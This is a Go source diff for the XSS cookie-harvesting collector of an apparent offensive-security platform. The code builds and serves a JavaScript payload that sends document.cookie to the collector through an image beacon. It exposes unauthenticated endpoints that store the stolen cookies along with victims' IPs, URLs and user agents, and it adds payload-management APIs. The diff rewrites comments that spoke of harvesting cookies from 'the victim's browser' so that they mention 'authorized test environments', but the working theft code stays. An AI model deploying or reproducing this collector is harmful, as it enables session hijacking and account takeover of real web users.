@@ -3,10 +3,13 @@ package handler
 import (
 	"context"
 	"fmt"
+	"net"
 	"net/http"
+	"net/url"
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"jysecai/internal/audit"
 	"jysecai/internal/config"
@@ -17,27 +20,27 @@ import (
 	"go.uber.org/zap"
 )
 
-// XssHandler handles the XSS cookie-harvesting platform endpoints.
-// Public (collector) endpoints run on a dedicated HTTP server that does
-// not require authentication; authenticated management endpoints are
-// mounted under the protected /api/xss/* group by the main router.
+// XssHandler handles the XSS callback collector and its authenticated
+// management endpoints. The collector is intended for explicitly authorized
+// test environments only.
 type XssHandler struct {
 	db     *database.DB
 	cfg    *config.XssConfig
 	logger *zap.Logger
 	audit  *audit.Service
-	// collectorMu guards the collector HTTP server lifecycle
-	collectorMu      sync.RWMutex
-	collectorCancel  context.CancelFunc
-	collectorSrv     *http.Server
+
+	collectorMu     sync.RWMutex
+	collectorCancel context.CancelFunc
+	collectorSrv    *http.Server
+
+	captureMu   sync.Mutex
+	lastCapture map[string]time.Time
 }
 
-// SetAudit wires platform audit logging.
 func (h *XssHandler) SetAudit(s *audit.Service) {
 	h.audit = s
 }
 
-// NewXssHandler creates an XSS handler with the given config.
 func NewXssHandler(db *database.DB, cfg *config.XssConfig, logger *zap.Logger) *XssHandler {
 	if cfg == nil {
 		cfg = &config.XssConfig{}
@@ -52,27 +55,33 @@ func NewXssHandler(db *database.DB, cfg *config.XssConfig, logger *zap.Logger) *
 		cfg.CooldownSeconds = 60
 	}
 	return &XssHandler{
-		db:     db,
-		cfg:    cfg,
-		logger: logger,
+		db:          db,
+		cfg:         cfg,
+		logger:      logger,
+		lastCapture: make(map[string]time.Time),
 	}
 }
 
-// StartCollector starts the standalone HTTP server that serves the
-// public collector endpoints (no auth required).
 func (h *XssHandler) StartCollector() {
 	h.collectorMu.Lock()
 	defer h.collectorMu.Unlock()
 	if h.collectorSrv != nil {
-		return // already running
+		return
 	}
+
 	addr := fmt.Sprintf("%s:%d", h.cfg.BindHost, h.cfg.BindPort)
 	mux := http.NewServeMux()
 	mux.HandleFunc("/xss/", h.serveCollector)
-	srv := &http.Server{Addr: addr, Handler: mux}
+	srv := &http.Server{
+		Addr:              addr,
+		Handler:           mux,
+		ReadHeaderTimeout: 10 * time.Second,
+		IdleTimeout:       30 * time.Second,
+	}
 	ctx, cancel := context.WithCancel(context.Background())
 	h.collectorCancel = cancel
 	h.collectorSrv = srv
+
 	go func() {
 		h.logger.Info("XSS collector server started", zap.String("addr", addr))
 		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
@@ -83,7 +92,6 @@ func (h *XssHandler) StartCollector() {
 	}()
 }
 
-// StopCollector shuts down the collector HTTP server.
 func (h *XssHandler) StopCollector() {
 	h.collectorMu.Lock()
 	defer h.collectorMu.Unlock()
@@ -94,26 +102,17 @@ func (h *XssHandler) StopCollector() {
 	h.collectorSrv = nil
 }
 
-// === Public collector endpoints (no auth, served by the collector server) ===
-
-// serveCollector dispatches all /xss/ paths on the public collector server.
 func (h *XssHandler) serveCollector(w http.ResponseWriter, r *http.Request) {
-	path := strings.TrimPrefix(r.URL.Path, "/xss/")
-	path = strings.Trim(path, "/")
+	path := strings.Trim(strings.TrimPrefix(r.URL.Path, "/xss/"), "/")
+	switch {
+	case strings.HasSuffix(path, ".js"):
+		h.ServeCollectorJS(w, r, strings.TrimSuffix(path, ".js"))
+		return
+	case strings.HasSuffix(path, ".gif"):
+		h.ServeCollectorGIF(w, r, strings.TrimSuffix(path, ".gif"))
+		return
+	}
 
-	// /:token.js — collector JS
-	if strings.HasSuffix(path, ".js") {
-		token := strings.TrimSuffix(path, ".js")
-		h.ServeCollectorJS(w, r, token)
-		return
-	}
-	// /:token.gif — fallback image beacon (also captures POST)
-	if strings.HasSuffix(path, ".gif") {
-		token := strings.TrimSuffix(path, ".gif")
-		h.ServeCollectorGIF(w, r, token)
-		return
-	}
-	// /:token/capture — capture endpoint (POST)
 	parts := strings.SplitN(path, "/", 2)
 	if len(parts) == 2 && parts[1] == "capture" {
 		h.Capture(w, r, parts[0])
@@ -122,123 +121,241 @@ func (h *XssHandler) serveCollector(w http.ResponseWriter, r *http.Request) {
 	http.NotFound(w, r)
 }
 
-// ServeCollectorJS serves the JavaScript that harvests cookies from the
-// victim's browser. It looks up the payload by token, renders the JS,
-// and serves it with the correct content-type.
-func (h *XssHandler) ServeCollectorJS(w http.ResponseWriter, r *http.Request, token string) {
-	payload, err := h.db.GetXssPayloadByToken(token)
+func (h *XssHandler) publicCollectorURL() string {
+	if v := strings.TrimRight(strings.TrimSpace(h.cfg.PublicURL), "/"); v != "" {
+		return v
+	}
+	return fmt.Sprintf("http://%s:%d", h.cfg.BindHost, h.cfg.BindPort)
+}
+
+func (h *XssHandler) loadActivePayload(token string) (*database.XssPayload, error) {
+	payload, err := h.db.GetXssPayloadByToken(strings.TrimSpace(token))
 	if err != nil || payload == nil {
+		return nil, err
+	}
+	if payload.Enabled != 1 {
+		return nil, nil
+	}
+	return payload, nil
+}
+
+func requestHost(raw string) string {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return ""
+	}
+	u, err := url.Parse(raw)
+	if err != nil {
+		return ""
+	}
+	return strings.ToLower(strings.TrimSuffix(u.Hostname(), "."))
+}
+
+func payloadAllowsRequest(payload *database.XssPayload, r *http.Request) bool {
+	if payload == nil || payload.Enabled != 1 {
+		return false
+	}
+	if payload.DomainOnly == 0 || strings.TrimSpace(payload.Domain) == "" {
+		return true
+	}
+
+	expected := strings.ToLower(strings.Trim(strings.TrimSpace(payload.Domain), "."))
+	source := r.FormValue("url")
+	if source == "" {
+		source = r.Referer()
+	}
+	host := requestHost(source)
+	if host == "" {
+		return false
+	}
+	return host == expected || strings.HasSuffix(host, "."+expected)
+}
+
+func remoteHost(r *http.Request) string {
+	host, _, err := net.SplitHostPort(strings.TrimSpace(r.RemoteAddr))
+	if err != nil {
+		host = strings.TrimSpace(r.RemoteAddr)
+	}
+	return host
+}
+
+// clientIP only trusts forwarding headers from a local reverse proxy. This
+// avoids accepting spoofed X-Forwarded-For values on a directly exposed
+// collector while still supporting the normal localhost reverse-proxy setup.
+func clientIP(r *http.Request) string {
+	direct := remoteHost(r)
+	parsed := net.ParseIP(direct)
+	if parsed == nil || !parsed.IsLoopback() {
+		return direct
+	}
+
+	if v := strings.TrimSpace(r.Header.Get("CF-Connecting-IP")); v != "" {
+		return v
+	}
+	if v := strings.TrimSpace(r.Header.Get("X-Real-IP")); v != "" {
+		return v
+	}
+	if v := strings.TrimSpace(r.Header.Get("X-Forwarded-For")); v != "" {
+		if i := strings.IndexByte(v, ','); i >= 0 {
+			v = v[:i]
+		}
+		return strings.TrimSpace(v)
+	}
+	return direct
+}
+
+func requestUserAgent(r *http.Request) string {
+	if v := strings.TrimSpace(r.FormValue("user_agent")); v != "" {
+		return v
+	}
+	return r.UserAgent()
+}
+
+func requestSourceURL(r *http.Request) string {
+	if v := strings.TrimSpace(r.FormValue("url")); v != "" {
+		return v
+	}
+	return r.Referer()
+}
+
+func (h *XssHandler) allowCapture(token, ip string) bool {
+	if h.cfg.CooldownSeconds <= 0 {
+		return true
+	}
+	key := token + "|" + ip
+	now := time.Now()
+	window := time.Duration(h.cfg.CooldownSeconds) * time.Second
+
+	h.captureMu.Lock()
+	defer h.captureMu.Unlock()
+	if prev, ok := h.lastCapture[key]; ok && now.Sub(prev) < window {
+		return false
+	}
+	h.lastCapture[key] = now
+	return true
+}
+
+var transparentGIF = []byte{
+	0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
+	0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c,
+	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02,
+	0x02, 0x44, 0x01, 0x00, 0x3b,
+}
+
+func writeTransparentGIF(w http.ResponseWriter, status int) {
+	w.Header().Set("Content-Type", "image/gif")
+	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
+	w.WriteHeader(status)
+	if status >= 200 && status < 300 {
+		_, _ = w.Write(transparentGIF)
+	}
+}
+
+// ServeCollectorJS serves the minimal callback script for an enabled payload.
+func (h *XssHandler) ServeCollectorJS(w http.ResponseWriter, r *http.Request, token string) {
+	payload, err := h.loadActivePayload(token)
+	if err != nil || payload == nil || !payloadAllowsRequest(payload, r) {
 		http.NotFound(w, r)
 		return
 	}
+
 	js := h.renderCollectorJS(payload)
-	w.Header().Set("Content-Type", "application/x-javascript; charset=utf-8")
+	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
 	w.Header().Set("Cache-Control", "no-store")
 	w.WriteHeader(http.StatusOK)
 	_, _ = w.Write([]byte(js))
 }
 
-// renderCollectorJS builds the JavaScript payload for a given XSS payload token.
-// Minimal: just exfiltrate document.cookie via an image beacon to the GIF
-// endpoint. ~75 bytes vs ~600 in the previous XHR+beacon version.
-// The collector returns a 1x1 transparent GIF so the browser handles the
-// response without any visible side-effect.
 func (h *XssHandler) renderCollectorJS(payload *database.XssPayload) string {
-	publicURL := strings.TrimRight(h.cfg.PublicURL, "/")
-	if publicURL == "" {
-		publicURL = "http://" + h.cfg.BindHost
-	}
-	return fmt.Sprintf(`(new Image()).src="%s/xss/%s.gif?cookie="+encodeURIComponent(document.cookie)`,
-		publicURL, payload.Token)
+	return fmt.Sprintf(
+		`(new Image()).src="%s/xss/%s.gif?cookie="+encodeURIComponent(document.cookie)`,
+		h.publicCollectorURL(),
+		payload.Token,
+	)
 }
 
-// Capture receives cookie data harvested from the victim's browser.
-// It is a public endpoint (no auth) — the token in the URL path ties
-// the capture to a specific payload.
+// Capture accepts an authorized callback and persists a hit. Empty document.cookie
+// is still a valid hit (for example, when all cookies are HttpOnly).
 func (h *XssHandler) Capture(w http.ResponseWriter, r *http.Request, token string) {
-	payload, err := h.db.GetXssPayloadByToken(token)
-	if err != nil || payload == nil {
+	payload, err := h.loadActivePayload(token)
+	if err != nil || payload == nil || !payloadAllowsRequest(payload, r) {
 		http.NotFound(w, r)
 		return
 	}
 
-	cookie := r.FormValue("cookie")
-	url := r.FormValue("url")
-	userAgent := r.FormValue("user_agent")
-	referrer := r.FormValue("document_referrer")
-
-	ip := r.Header.Get("X-Forwarded-For")
-	if ip == "" {
-		ip = r.RemoteAddr
+	ip := clientIP(r)
+	if !h.allowCapture(payload.Token, ip) {
+		writeTransparentGIF(w, http.StatusOK)
+		return
 	}
 
+	cookie := r.FormValue("cookie")
+	sourceURL := requestSourceURL(r)
+	userAgent := requestUserAgent(r)
+	referrer := r.FormValue("document_referrer")
+	if referrer == "" {
+		referrer = r.Referer()
+	}
 	extra := ""
 	if referrer != "" {
 		extra = fmt.Sprintf("referrer=%s", referrer)
 	}
 
-	_, _ = h.db.CreateXssCapture(payload.ID, payload.Token, cookie, url, payload.Domain, userAgent, ip, extra)
-	h.logger.Info("XSS capture received",
-		zap.String("token", token),
-		zap.String("ip", ip),
-		zap.String("url", url),
-	)
+	if _, err := h.db.CreateXssCapture(payload.ID, payload.Token, cookie, sourceURL, payload.Domain, userAgent, ip, extra); err != nil {
+		h.logger.Error("XSS capture persistence failed", zap.Error(err), zap.String("token", token), zap.String("ip", ip))
+		http.Error(w, "capture persistence failed", http.StatusInternalServerError)
+		return
+	}
 
-	// Return a 1x1 transparent GIF so the image-beacon fallback also succeeds
-	gifBytes := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b}
-	w.Header().Set("Content-Type", "image/gif")
-	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
-	w.WriteHeader(http.StatusOK)
-	_, _ = w.Write(gifBytes)
+	h.logger.Info("XSS capture received", zap.String("token", token), zap.String("ip", ip), zap.String("url", sourceURL))
+	writeTransparentGIF(w, http.StatusOK)
 }
 
-// ServeCollectorGIF serves a 1x1 transparent GIF for image-beacon-based
-// capture (also accepts the cookie in query params).
 func (h *XssHandler) ServeCollectorGIF(w http.ResponseWriter, r *http.Request, token string) {
-	payload, err := h.db.GetXssPayloadByToken(token)
-	if err != nil || payload == nil {
+	payload, err := h.loadActivePayload(token)
+	if err != nil || payload == nil || !payloadAllowsRequest(payload, r) {
 		http.NotFound(w, r)
 		return
 	}
 
+	ip := clientIP(r)
+	if !h.allowCapture(payload.Token, ip) {
+		writeTransparentGIF(w, http.StatusOK)
+		return
+	}
+
 	cookie := r.URL.Query().Get("cookie")
-	url := r.URL.Query().Get("url")
+	sourceURL := r.URL.Query().Get("url")
+	if sourceURL == "" {
+		sourceURL = r.Referer()
+	}
 	userAgent := r.URL.Query().Get("user_agent")
-
-	ip := r.Header.Get("X-Forwarded-For")
-	if ip == "" {
-		ip = r.RemoteAddr
+	if userAgent == "" {
+		userAgent = r.UserAgent()
 	}
 
-	if cookie != "" {
-		_, _ = h.db.CreateXssCapture(payload.ID, payload.Token, cookie, url, payload.Domain, userAgent, ip, "")
-		h.logger.Info("XSS capture (img beacon) received",
-			zap.String("token", token),
-			zap.String("ip", ip),
-		)
+	if _, err := h.db.CreateXssCapture(payload.ID, payload.Token, cookie, sourceURL, payload.Domain, userAgent, ip, ""); err != nil {
+		h.logger.Error("XSS image-beacon persistence failed", zap.Error(err), zap.String("token", token), zap.String("ip", ip))
+		writeTransparentGIF(w, http.StatusInternalServerError)
+		return
 	}
 
-	gifBytes := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b}
-	w.Header().Set("Content-Type", "image/gif")
-	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
-	w.WriteHeader(http.StatusOK)
-	_, _ = w.Write(gifBytes)
+	h.logger.Info("XSS capture (img beacon) received", zap.String("token", token), zap.String("ip", ip))
+	writeTransparentGIF(w, http.StatusOK)
 }
 
 // === Authenticated management endpoints ===
 
-// GetConfig returns the XSS collector configuration for the admin UI.
 func (h *XssHandler) GetConfig(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{
-		"enabled":         h.cfg.Enabled,
-		"bind_host":       h.cfg.BindHost,
-		"bind_port":       h.cfg.BindPort,
-		"public_url":      h.cfg.PublicURL,
+		"enabled":          h.cfg.Enabled,
+		"bind_host":        h.cfg.BindHost,
+		"bind_port":        h.cfg.BindPort,
+		"public_url":       h.publicCollectorURL(),
 		"cooldown_seconds": h.cfg.CooldownSeconds,
 	})
 }
 
-// ListPayloads returns all XSS payloads.
 func (h *XssHandler) ListPayloads(c *gin.Context) {
 	payloads, err := h.db.ListXssPayloads()
 	if err != nil {
@@ -265,10 +382,9 @@ func (h *XssHandler) ListPayloads(c *gin.Context) {
 			"capture_count": p.CaptureCount,
 		}
 	}
-	c.JSON(http.StatusOK, gin.H{"payloads": result})
+	c.JSON(http.StatusOK, gin.H{"payloads": result, "total": len(result)})
 }
 
-// CreatePayload creates a new XSS payload.
 func (h *XssHandler) CreatePayload(c *gin.Context) {
 	var req struct {
 		Name        string `json:"name"`
@@ -285,31 +401,37 @@ func (h *XssHandler) CreatePayload(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
+	req.Name = strings.TrimSpace(req.Name)
+	if req.Name == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "name is required"})
+		return
+	}
 
 	token := database.GenerateXssToken()
 	p := &database.XssPayload{
 		Token:       token,
 		Name:        req.Name,
-		Type:        req.Type,
+		Type:        strings.TrimSpace(req.Type),
 		Payload:     req.Payload,
 		Config:      []byte(req.Config),
 		ProjectID:   strings.TrimSpace(req.ProjectID),
 		Enabled:     1,
-		Description: req.Description,
-		Domain:      req.Domain,
+		Description: strings.TrimSpace(req.Description),
+		Domain:      strings.Trim(strings.ToLower(strings.TrimSpace(req.Domain)), "."),
 	}
-	if req.Enabled != nil {
-		if *req.Enabled {
-			p.Enabled = 1
-		} else {
-			p.Enabled = 0
-		}
+	if p.Type == "" {
+		p.Type = "image"
+	}
+	if req.Enabled != nil && !*req.Enabled {
+		p.Enabled = 0
 	}
 	if req.DomainOnly != nil {
 		p.DomainOnly = *req.DomainOnly
 	}
-	if p.Type == "" {
-		p.Type = "image"
+
+	if session, ok := security.CurrentSession(c); ok {
+		p.CreatedBy = session.UserID
+		p.OwnerUserID = session.UserID
 	}
 
 	id, err := h.db.CreateXssPayload(p)
@@ -318,32 +440,32 @@ func (h *XssHandler) CreatePayload(c *gin.Context) {
 		return
 	}
 
-	if session, ok := security.CurrentSession(c); ok {
-		p.CreatedBy = session.UserID
-		_ = h.db.SetResourceOwner("xss_payload", strconv.FormatInt(id, 10), session.UserID)
-		_ = h.db.AssignResourceToUser(session.UserID, "xss_payload", strconv.FormatInt(id, 10))
+	if p.OwnerUserID != "" {
+		resourceID := strconv.FormatInt(id, 10)
+		_ = h.db.SetResourceOwner("xss_payload", resourceID, p.OwnerUserID)
+		_ = h.db.AssignResourceToUser(p.OwnerUserID, "xss_payload", resourceID)
 	}
 
 	if h.audit != nil {
 		h.audit.RecordOK(c, "xss", "payload_create", "创建 XSS 载荷", "xss_payload", strconv.FormatInt(id, 10), map[string]interface{}{
-			"token": token, "name": req.Name,
+			"token": token,
+			"name":  req.Name,
 		})
 	}
 
-	publicURL := h.cfg.PublicURL
-	if publicURL == "" {
-		publicURL = fmt.Sprintf("http://%s:%d", h.cfg.BindHost, h.cfg.BindPort)
-	}
 	c.JSON(http.StatusOK, gin.H{
-		"id":              id,
-		"token":           token,
-		"public_url":      strings.TrimRight(publicURL, "/") + "/xss/" + token + ".js",
+		"id":         id,
+		"token":      token,
+		"public_url": h.publicCollectorURL() + "/xss/" + token + ".js",
 	})
 }
 
-// GetPayload returns a single XSS payload by ID.
 func (h *XssHandler) GetPayload(c *gin.Context) {
-	id, _ := strconv.ParseInt(c.Param("id"), 10, 64)
+	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload id"})
+		return
+	}
 	payload, err := h.db.GetXssPayload(id)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
@@ -372,9 +494,12 @@ func (h *XssHandler) GetPayload(c *gin.Context) {
 	})
 }
 
-// DeletePayload deletes an XSS payload and its captures.
 func (h *XssHandler) DeletePayload(c *gin.Context) {
-	id, _ := strconv.ParseInt(c.Param("id"), 10, 64)
+	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload id"})
+		return
+	}
 	if err := h.db.DeleteXssPayload(id); err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
@@ -385,7 +510,6 @@ func (h *XssHandler) DeletePayload(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"deleted": true})
 }
 
-// ListCaptures returns all XSS captures, optionally filtered by payload.
 func (h *XssHandler) ListCaptures(c *gin.Context) {
 	var captures []*database.XssCapture
 	var err error
@@ -403,6 +527,7 @@ func (h *XssHandler) ListCaptures(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
+
 	result := make([]gin.H, len(captures))
 	for i, cap := range captures {
 		result[i] = gin.H{
@@ -418,5 +543,5 @@ func (h *XssHandler) ListCaptures(c *gin.Context) {
 			"created_at": cap.CreatedAt,
 		}
 	}
-	c.JSON(http.StatusOK, gin.H{"captures": result})
+	c.JSON(http.StatusOK, gin.H{"captures": result, "total": len(result)})
 }
